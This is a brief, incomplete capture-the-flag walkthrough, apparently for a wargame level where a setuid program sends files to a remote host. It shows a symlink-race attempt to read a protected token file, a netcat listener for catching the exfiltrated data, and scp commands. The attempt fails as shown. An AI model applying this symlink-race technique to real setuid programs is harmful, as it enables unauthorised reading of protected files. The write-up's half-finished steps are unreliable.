    
In this level, we have an executable which will send a file to a remote host.
    ls -l
    
            -rwsr-s---+ 1 flag10 level10 8617 Mar  5  2016 level10
            -rw-------  1 flag10 flag10    26 Mar  5  2016 token

We can create a symlink to try to read the content in token file (symlink race)

    ln -s /home/user/level10/token /tmp/flag

Now let's try to send my file to the server

    ./level10 /tmp/flag 192.168.56.101
        You don't have access to /tmp/flag
    cat /tmp/flag
            cat: /tmp/flag: Permission denied

Nope, still unable to execute my flag and to send it to a server

To open a port in your machine:
    nc -l 6969

let's get the executable to my host with scp

    scp -P 4242 level10@192.168.56.101:/tmp/flag /mnt/nfs/homes/emaugale/Desktop

So you have to find a way to make your file accessible to the server.